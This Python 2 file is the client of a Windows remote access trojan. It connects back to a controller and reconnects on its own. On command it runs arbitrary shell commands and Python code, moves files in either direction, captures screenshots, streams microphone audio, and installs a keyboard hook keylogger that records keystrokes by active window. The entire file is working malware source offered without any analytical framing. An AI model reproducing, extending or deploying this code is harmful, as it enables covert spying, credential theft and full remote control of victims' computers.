# -*- coding: utf-8 -*-
# !/usr/bin/python

import socket
import time
import os
import subprocess
import threading
import ctypes
from ctypes.wintypes import MSG
import sys
import platform
import zlib
import pyaudio

# INIT VARIABLES
HOST = '127.0.0.1'
PORT = 4434
active = False
passKey = r'1705a7f91b40320a19db18912b72148e'  # MD5 key: paroli123
__version__ = '1.0'
__ostype__ = str(sys.platform)
__os__ = str(platform.platform())
__user__ = str(platform.node())
# INIT Widnows DLL's
Kernel32 = ctypes.windll.kernel32
User32 = ctypes.windll.user32
Gdi32 = ctypes.windll.gdi32
# INIT Sockets bank
socketsBank = {}
# INIT Screen*
hDesktopWnd = User32.GetDesktopWindow()
left = User32.GetSystemMetrics(76)
top = User32.GetSystemMetrics(77)
right = User32.GetSystemMetrics(78)
bottom = User32.GetSystemMetrics(79)
width = right - left
height = bottom - top


class BITMAPFILEHEADER(ctypes.Structure):
    _fields_ = [
        ('bfType', ctypes.c_short),
        ('bfSize', ctypes.c_uint32),
        ('bfReserved1', ctypes.c_short),
        ('bfReserved2', ctypes.c_short),
        ('bfOffBits', ctypes.c_uint32)]


class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [
        ('biSize', ctypes.c_uint32),
        ('biWidth', ctypes.c_int),
        ('biHeight', ctypes.c_int),
        ('biPlanes', ctypes.c_short),
        ('biBitCount', ctypes.c_short),
        ('biCompression', ctypes.c_uint32),
        ('biSizeimage', ctypes.c_uint32),
        ('biXPelsPerMeter', ctypes.c_long),
        ('biYPelsPerMeter', ctypes.c_long),
        ('biClrUsed', ctypes.c_uint32),
        ('biClrImportant', ctypes.c_uint32)]


class BITMAPINFO(ctypes.Structure):
    _fields_ = [
        ('bmiHeader', BITMAPINFOHEADER),
        ('bmiColors', ctypes.c_ulong * 3)]


bmp_info = BITMAPINFO()


# Get info about app & pc
def pc_info():
    return str({
        'ostype': __ostype__,
        'os': __os__,
        'protection': str(active),
        'user': __user__,
        'version': __version__,
        'activewindowtitle': get_window_title(),
    })

shiftcodes = {
    49: '!', 50: '@', 51: '#', 52: '$', 53: '%',
    54: '^', 55: '&', 56: '*', 57: '(', 48: ')',
    189: '_', 187: '+', 219: '{', 221: '}', 220: '|',
    186: ':', 222: '"', 188: '<', 190: '>', 191: '?',
}
keycodes = {
    160: '', 161: '', 32: '&nbsp;',
    9: '<font color=#288DA1>{tab}</font>', 8: '<font color=#D32B4E>{del}</font>', 162: '', 163: '', 144: '',
    35: '', 34: '', 33: '', 36: '', 45: '', 145: '', 19: '', 13: '<br>'
}
updateCode = {
    189: '-', 187: '=', 219: '[', 221: ']', 220: '\\',
    186: ';', 222: '\'', 188: ',', 190: '.', 191: '/',
    96: '0', 97: '1', 98: '2', 99: '3', 100: '4',
    101: '5', 102: '6', 103: '7', 104: '8', 105: '9',
    111: '/', 106: '*', 109: '-', 107: '+',
    110: '.'
}


def update_key(k):
    if updateCode.has_key(k):
        return updateCode[k]
    else:
        return str(chr(k))


def get_fptr(fn):
    cmpfunc = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
    return cmpfunc(fn)


def send(sock, _data, mode, splitter='%:::%', end="[ENDOFMESSAGE]"):
    msg = (_data + end).encode('utf-8')
    size = sys.getsizeof(msg)
    msg = mode + splitter + msg
    sock.sendall(str(size) + '%:::%' + msg)


def receive(sock, splitter='%:::%', end="[ENDOFMESSAGE]"):
    received_data = ""
    l = sock.recv(1024)
    while l:
        received_data = received_data + l
        if received_data.endswith(end):
            break
        else:
            l = sock.recv(1024)
    if received_data.count(splitter):
        _type, message = received_data.split(splitter)
        return _type, message[:-len(end)].decode('utf-8')
    else:
        return 'info', ''


def upload(sock, filename, end="[ENDOFMESSAGE]"):

    sock.sendall(str(os.path.getsize(filename)))
    if sock.recv(2) == 'ok':
        with open(filename, 'rb') as _file:
            while 1:
                l = _file.readline()
                if l:
                    sock.sendall(l)
                else:
                    sock.sendall(end)
                    break
            return 'uploadDone'
    return 'uploadError'


def download(sock, filename, end="[ENDOFMESSAGE]"):
    received_data = ''
    try:
        l = sock.recv(1024)
        while l:
            received_data += l
            if received_data.endswith(end):
                break
            else:
                l = sock.recv(1024)
        with open(filename, 'wb') as _file:
            _file.write(received_data[:-len(end)])
        return 'downloadDone'
    except:
        return 'downloadError'


def get_default_input_device():
    p = pyaudio.PyAudio()
    device_name = p.get_default_input_device_info()
    return device_name['name']


def screen_bits():
    h_desktop_dc = User32.GetWindowDC(hDesktopWnd)
    h_capture_dc = Gdi32.CreateCompatibleDC(h_desktop_dc)
    h_capture_bitmap = Gdi32.CreateCompatibleBitmap(h_desktop_dc, width, height)
    Gdi32.SelectObject(h_capture_dc, h_capture_bitmap)
    Gdi32.BitBlt(h_capture_dc, 0, 0, width, height, h_desktop_dc, left, top, 0x00CC0020)
    hdc = User32.GetDC(None)
    bmp_info.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
    dib_rgb_colors = 0
    Gdi32.GetDIBits(hdc, h_capture_bitmap, 0, 0, None, ctypes.byref(bmp_info), dib_rgb_colors)
    bmp_info.bmiHeader.biSizeimage = int(
            bmp_info.bmiHeader.biWidth * abs(bmp_info.bmiHeader.biHeight) * (bmp_info.bmiHeader.biBitCount + 7) / 8)
    p_buf = ctypes.create_unicode_buffer(bmp_info.bmiHeader.biSizeimage)
    Gdi32.GetBitmapBits(h_capture_bitmap, bmp_info.bmiHeader.biSizeimage, p_buf)
    return zlib.compress(p_buf)


def execute(source):
    data = ''
    try:
        exec source
        if data == '':
            return 'No output<br>example: data = "SOME TEXT OR VARIABLE"'
        return str(data)
    except Exception as e:
        return str(e)


def exec_(cmde):
    if cmde:
        try:
            execproc = subprocess.Popen(cmde, shell=True,
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            cmdoutput = execproc.stdout.read() + execproc.stderr.read()
            return cmdoutput
        except Exception as e:
            return str(e)

    else:
        return "Enter a command.\n"


def has_hidden_attribute(filepath):
    try:
        attrs = Kernel32.GetFileAttributesW(unicode(filepath))
        assert attrs != -1
        result = bool(attrs & 2)
    except (AttributeError, AssertionError):
        result = False
    return result


def set_content_attribute(filepath):
    if has_hidden_attribute:
        Kernel32.SetFileAttributesW(filepath, 1)
    else:
        Kernel32.SetFileAttributesW(filepath, 2)


def get_screenshot():
    return str({
        'width': width,
        'height': height,
        'screenshotbits': screen_bits()
    })


def ls():
    string = {
        'path': os.getcwdu()
    }
    try:
        for n, i in enumerate(os.listdir(u'.')):
            string[str(n)] = {
                'name': i,
                'type': os.path.isfile(i),
                'size': os.path.getsize(i),
                'modified': time.ctime(os.path.getmtime(i)),
                'hidden': has_hidden_attribute(i)
            }
        return str(string)
    except WindowsError:
        return 'windowsError'


def get_window_title():
    get_foreground_window = User32.GetForegroundWindow
    get_window_text_length = User32.GetWindowTextLengthW
    get_window_text = User32.GetWindowTextW
    hwnd = get_foreground_window()
    length = get_window_text_length(hwnd)
    buff = ctypes.create_unicode_buffer(length + 1)
    get_window_text(hwnd, buff, length + 1)
    return buff.value


class ChildSocket(threading.Thread):
    def __init__(self, id, mode):
        super(ChildSocket, self).__init__()

        self.active = True
        self.id = id
        self.mode = mode

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def run(self):

        self.socket.connect((HOST, PORT))

        while self.active:
            try:
                mode, data = receive(self.socket)
                if data == 'pcinfo':
                    stdoutput = pc_info()
                elif data.startswith('upload '):
                    try:
                        filename = data.split(' ')[1]
                        stdoutput = download(self.socket, filename)
                    except:
                        stdoutput = 'uploadError'
                elif data.startswith('download '):
                    try:
                        filename = data.split(' ')[1]
                        stdoutput = upload(self.socket, filename)
                    except:
                        stdoutput = 'downloadError'
                elif data.startswith('getDefaultInputDeviceName'):
                    stdoutput = get_default_input_device()
                elif data.startswith('startAudio'):
                    try:
                        audio_thread = AudioStreaming(self.socket, int(data.split(' ')[-1]))
                        audio_thread.start()
                        stdoutput = 'audioStarted'
                    except:
                        stdoutput = 'audioError'
                elif data.startswith('stopAudio'):
                    try:
                        audio_thread.active = False
                    except:
                        pass
                    stdoutput = 'audioStopped'
                elif data.startswith('startKeylogger'):
                    try:
                        keylogger_thread = Key()
                        keylogger_thread.start()
                        stdoutput = 'keyloggerStarted'
                    except:
                        stdoutput = 'keyloggerError'
                elif data.startswith('stopKeylogger'):
                    try:
                        keylogger_thread.keyLogger.uninstall_hook_proc()
                    except:
                        pass
                    stdoutput = 'keyloggerStopped'
                elif data.startswith('getKeystokes'):
                    try:
                        stdoutput = str(keylogger_thread.logs)
                        keylogger_thread.logs = {}
                    except AttributeError:
                        stdoutput = 'keystokesError'
                elif data.startswith('getScreenshot'):
                    stdoutput = get_screenshot()
                elif data.startswith("cd"):
                    try:
                        os.chdir(data[3:])
                        stdoutput = ""
                    except:
                        stdoutput = "Error opening directory"
                elif data.startswith('Activate'):
                    stdoutput = ''
                elif data.startswith('runscript '):
                    stdoutput = execute(data[10:])
                elif data.startswith('ls'):
                    stdoutput = ls()
                elif data.startswith('myinfo'):
                    stdoutput = self.mode + ' ' + self.id
                else:
                    stdoutput = exec_(data)
                send(self.socket, stdoutput, mode)
                del stdoutput
            except socket.error:
                return


class AudioStreaming(threading.Thread):
    def __init__(self, sock, rate):
        super(AudioStreaming, self).__init__()

        self.active = True
        self.sock = sock

        self.chunk = 1024
        self.format = pyaudio.paInt16
        self.channel = 1
        self.rate = rate

        self.p = pyaudio.PyAudio()

        self.stream = self.p.open(format=self.format, channels=self.channel, rate=self.rate, input=True,
                                  frames_per_buffer=self.chunk)

    def run(self):
        while self.active:
            try:
                data = self.stream.read(self.chunk)
                self.sock.sendall(data)
            except socket.error:
                self.active = False
                break

        self.stream.close()
        self.p.terminate()


class KeyLogger:
    def __init__(self):
        self.hooked = None

    def install_hook_proc(self, pointer):
        self.hooked = User32.SetWindowsHookExA(13, pointer, Kernel32.GetModuleHandleW(None), 0)
        if not self.hooked:
            return False
        return True

    def uninstall_hook_proc(self):
        if self.hooked is None:
            return
        ctypes.windll.user32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None


class Key(threading.Thread):
    def __init__(self):
        super(Key, self).__init__()

        self.logs = {}

    def write_key(self, log):
        current_window_title = get_window_title()
        if self.logs.has_key(current_window_title):
            self.logs[current_window_title] += log
        else:
            self.logs[current_window_title] = log

    def hook_proc(self, n_code, w_param, l_param):

        if w_param is not 0x0100:
            return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)

        if keycodes.has_key(l_param[0]):
            key = keycodes[l_param[0]]
        else:
            if User32.GetKeyState(0x14) & 1:
                if User32.GetKeyState(0x10) & 0x8000:
                    key = shiftcodes[l_param[0]] if shiftcodes.has_key(l_param[0]) else update_key(
                        l_param[0]).lower()
                else:
                    key = update_key(l_param[0]).upper()
            else:
                if User32.GetKeyState(0x10) & 0x8000:
                    key = shiftcodes[l_param[0]] if shiftcodes.has_key(l_param[0]) else update_key(
                        l_param[0]).upper()
                else:
                    key = update_key(l_param[0]).lower()
        self.write_key(key)

        return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)

    def start_keylogger(self):
        msg = MSG()
        User32.GetMessageA(ctypes.byref(msg), 0, 0, 0)

    def run(self):
        self.keyLogger = KeyLogger()
        self.pointer = get_fptr(self.hook_proc)
        if self.keyLogger.install_hook_proc(self.pointer):
            pass
        self.start_keylogger()


def start_child_socket(id_, mode):
    socketsBank[id_] = ChildSocket(id_, mode)
    socketsBank[id_].start()
    return id_


def from_autostart():
    global active
    global passKey
    while 1:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
        except:
            active = False
            time.sleep(5)
            continue

        while 1:
            try:
                mode, data = receive(s)
                if data == 'info':
                    send(s, pc_info(), mode)
                    continue
                if data == 'getScreen':
                    send(s, get_screenshot(), mode)
                    continue
                if data.startswith('startChildSocket'):
                    send(s, start_child_socket(str(data.split(' ')[-1]), mode), mode)
                    continue
                if data == passKey:
                    active = True
                    send(s, 'iamactive', mode)
                    while active:
                        mode, data = receive(s)
                        if data == "lock":
                            active = False
                            break
                        if data == 'info':
                            stdoutput = pc_info()
                        elif data.startswith('startChildSocket'):
                            stdoutput = start_child_socket(str(data.split(' ')[-1]), mode)
                        elif data == 'getScreen':
                            stdoutput = get_screenshot()
                        else:
                            stdoutput = exec_(data)
                        send(s, stdoutput, mode=mode)
                    if data == "terminate":
                        break
                    time.sleep(3)
                else:
                    send(s, 'parent', mode)
            except socket.error:
                s.close()
                active = False
                time.sleep(10)
                break


from_autostart()
